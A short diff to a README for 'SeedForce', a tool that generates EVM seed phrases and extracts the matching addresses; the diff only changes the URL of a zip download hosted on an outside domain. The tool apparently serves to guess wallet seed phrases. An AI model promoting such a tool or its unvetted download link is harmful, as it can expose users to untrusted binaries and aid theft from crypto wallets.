@@ -4,7 +4,7 @@ Generates an EVM-compatible 12 or 24 word sentence, extracts the associated addr
 
 ## Release
 
-You can access and download the latest version [here](https://api.natyx.net/SeedForce.zip)
+You can access and download the latest version [here](https://api.natyx.net/download/SeedForce.zip)
 
 ## Installation
 
